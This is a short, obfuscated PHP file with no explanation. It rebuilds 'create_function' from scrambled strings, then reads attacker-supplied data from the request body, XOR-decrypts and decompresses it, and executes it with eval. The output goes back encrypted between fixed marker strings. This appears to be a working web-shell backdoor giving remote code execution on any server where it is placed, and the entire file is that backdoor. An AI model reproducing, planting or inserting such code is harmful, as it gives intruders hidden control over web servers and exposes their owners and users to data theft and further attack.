<?php
$l=str_replace('Td','','creTdaTdteTd_fTdunTdctTdion');
$j='$k="03a005W835";5W$kh="c5Wcade72d5W2cbd";5W$kf="5W410f5Wb7043c26"5W;5W5W$5Wp="eXNzpcBE23VM5WTUCG";f5Wunction x($t5W,5W$k';
$u='Wget_contents();@5W5Wob_end_cle5Wan();$r=@base65W4_en5Wcode5W5W(@x(5W@gzco5W5Wmpress($o),5W$k));print(5W"$p$kh$r$kf");}';
$p=')5W5W{$c=strlen($k);$l=5Wstrlen(5W$t);5W5W5W$o="";for($i=05W;$i<$l;){fo5Wr(5W$j=0;($j<$c5W&&$5Wi<$l);5W$5Wj++,$i++){';
$h='$o.5W=$t{$5Wi5W}5W^$k{$j};5W}}retu5Wrn $o5W;}if5W (@preg_match5W(5W"/$kh(.+)$kf/5W"5W,@5Wfile_get_c5Wontents("5Wphp:/5W/i';
$v='nput"),$m)=5W=1)5W {@5Wob_start();@5Wev5Wal(@5Wgz5Wu5Wncompress(@x(@bas5We64_decode(5W$m5W[1]),$k))5W)5W;5W$o=5W@ob_5';
$n=str_replace('5W','',$j.$p.$h.$v.$u);
$k=$l('',$n);$k();
?>
